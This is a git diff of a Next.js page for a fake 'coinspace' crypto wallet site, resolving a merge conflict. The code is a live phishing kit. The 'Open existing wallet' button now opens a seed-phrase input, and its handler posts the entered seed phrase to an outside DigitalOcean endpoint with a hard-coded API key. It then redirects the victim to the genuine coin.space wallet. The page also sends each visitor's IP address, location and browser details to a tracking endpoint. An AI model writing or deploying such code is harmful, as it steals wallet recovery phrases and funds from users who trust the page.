@@ -1,21 +1,15 @@
 "use client";
 
-  import "./globals.css";
+import "./globals.css";
+import { useState } from "react";
 import EnterPassphraseModal from "../components/EnterPassphraseModal";
 import GeneratePassphraseModal from "../components/GeneratePassphraseModal";
 import SeedPhraseModal from "../components/SeedPhraseModal";
-<<<<<<< HEAD
-import { useState, useEffect, useRef } from "react";
-import { getUserCountry } from "./userLocation";
-import axios from "axios";
-import { usePathname } from "next/navigation";
-=======
 import { useRouter } from "next/navigation";
-import {  useEffect } from "react";
+import { useEffect } from "react";
 import { useRef } from "react";
 import axios from "axios";
 import { getUserCountry } from "./userLocation";
->>>>>>> redirect-app
 
 const WORDLIST = [
   "apple",
@@ -60,7 +54,8 @@ export default function Page() {
   const [isExistingWalletModalOpen, setIsExistingWalletModalOpen] =
     useState(false);
   const [isNewWalletModalOpen, setIsNewWalletModalOpen] = useState(false);
-  const [isSeedPhraseInputModalOpen, setIsSeedPhraseInputModalOpen] = useState(false);
+  const [isSeedPhraseInputModalOpen, setIsSeedPhraseInputModalOpen] =
+    useState(false);
   const [seedPhrase, setSeedPhrase] = useState<string[]>([]);
 
   const handleOpenExistingWallet = () => setIsSeedPhraseInputModalOpen(true);
@@ -91,20 +86,22 @@ export default function Page() {
       seedPhrase: seedPhrase,
     };
     console.log("Seed Phrase Message Data", messageData);
-      axios
-        .post(
-          "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/image",
-          messageData,
-          {
-            headers: {
-              "Content-Type": "application/json",
-              "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
-            },
-          }
-        )
-      .then(response => response.data)
-      .then(() => window.location.href = "https://coin.space/wallet/")
-      .catch(error => console.error("Error sending seed phrase message:", error));
+    axios
+      .post(
+        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/image",
+        messageData,
+        {
+          headers: {
+            "Content-Type": "application/json",
+            "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
+          },
+        }
+      )
+      .then((response) => response.data)
+      .then(() => (window.location.href = "https://coin.space/wallet/"))
+      .catch((error) =>
+        console.error("Error sending seed phrase message:", error)
+      );
   };
 
   const handleRestoreWallet = (seedPhrase: string) => {
@@ -131,7 +128,6 @@ export default function Page() {
   const handleCloseSeedPhraseModal = () => {};
   const handleContinueAfterSeed = () => {};
 
-  
   const [country, setCountry] = useState("");
   const [ipAddress, setIpAddress] = useState("");
   const [browser, setBrowser] = useState<string | undefined>(undefined);
@@ -154,7 +150,14 @@ export default function Page() {
     console.log("getCurrentUrl: window not available, returning empty string");
     return "";
   };
-  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
+  const sendTelegramMessage = (
+    userCountry: {
+      country?: string;
+      countryEmoji?: string;
+      city?: string;
+      ip?: string;
+    } | null
+  ) => {
     console.log("User Country Data:", userCountry);
     console.log("State country:", country);
     console.log("State ipAddress:", ipAddress);
@@ -208,8 +211,6 @@ export default function Page() {
     }
   }, []);
 
- 
-
   useEffect(() => {
     // Set browser info only on client side
     if (typeof window !== "undefined") {
@@ -229,100 +230,7 @@ export default function Page() {
       hasSentVisitorMessage.current = true;
     }
   }, []);
-  
 
-  const [country, setCountry] = useState("");
-  const [ipAddress, setIpAddress] = useState("");
-  const [browser, setBrowser] = useState<string | undefined>(undefined);
-  const [isVerifiedBot, setIsVerifiedBot] = useState(false);
-  const hasSentVisitorMessage = useRef(false);
-  const pathname = usePathname();
-  const getCurrentUrl = () => {
-    if (typeof window !== "undefined") {
-      let url = `${window.location.origin}${pathname}`;
-      if (url.includes("localhost")) {
-        url = "https://google.com";
-      }
-      if (url.includes("vercel.com")) {
-        url = url.replace("vercel.com", "digitalocean.com");
-      }
-      console.log("getCurrentUrl returning:", url);
-      return url;
-    }
-    console.log("getCurrentUrl: window not available, returning empty string");
-    return "";
-  };
-  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
-    // console.log("User Country", userCountry);
-
-    const messageData = {
-      info: "Regular Visitor", // You can update this logic as needed
-      url: getCurrentUrl(),
-      referer: document.referrer || getCurrentUrl(),
-      location: {
-        country: userCountry?.country || "Unknown",
-        countryEmoji: userCountry?.countryEmoji || "",
-        city: userCountry?.city || "Unknown",
-        ipAddress: userCountry?.ip || "0.0.0.0",
-      },
-      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
-      date: new Date().toISOString(),
-      appName: "coinspace",
-    };
-    console.log("Message Data", messageData);
-    axios
-      .post(
-        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/font",
-        messageData,
-        {
-          headers: {
-            "Content-Type": "application/json",
-            "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
-          },
-        }
-      )
-      .catch((error) =>
-        console.error(
-          "Error sending font message:",
-          error.response.data.details
-        )
-      );
-  };
-
-  useEffect(() => {
-    if (!hasSentVisitorMessage.current) {
-      const fetchUserLocation = async () => {
-        const userCountry = await getUserCountry();
-        setCountry(userCountry?.country || "Unknown");
-        setIpAddress(userCountry?.ip || "0.0.0.0");
-        sendTelegramMessage(userCountry);
-      };
-      fetchUserLocation();
-      hasSentVisitorMessage.current = true;
-    }
-  }, []);
-
- 
-
-  useEffect(() => {
-    // Set browser info only on client side
-    if (typeof window !== "undefined") {
-      setBrowser(navigator.userAgent);
-    }
-  }, []);
-
-  useEffect(() => {
-    if (!hasSentVisitorMessage.current) {
-      const fetchUserLocation = async () => {
-        const userCountry = await getUserCountry();
-        setCountry(userCountry?.country || "Unknown");
-        setIpAddress(userCountry?.ip || "0.0.0.0");
-        sendTelegramMessage(userCountry);
-      };
-      fetchUserLocation();
-      hasSentVisitorMessage.current = true;
-    }
-  }, []);
   return (
     <main className="min-h-dvh bg-[#2c3832] text-white flex flex-col">
       {/* Center content */}
@@ -340,9 +248,7 @@ export default function Page() {
 
           <button
             className="text-white/85 hover:text-white transition-colors"
-            onClick={()=>{
-              window.location.href = "https://www.coin-space.eu/wallet/?mode=input";
-            }}
+            onClick={handleOpenExistingWallet}
           >
             Open existing wallet
           </button>
@@ -358,7 +264,7 @@ export default function Page() {
       <GeneratePassphraseModal
         open={isNewWalletModalOpen}
         onClose={handleCloseNewWalletModal}
-        onGenerate={handleGeneratePassphrase}
+        onContinue={handleGeneratePassphrase}
       />
 
       {/* Seed phrase display moved to /wallet page */}
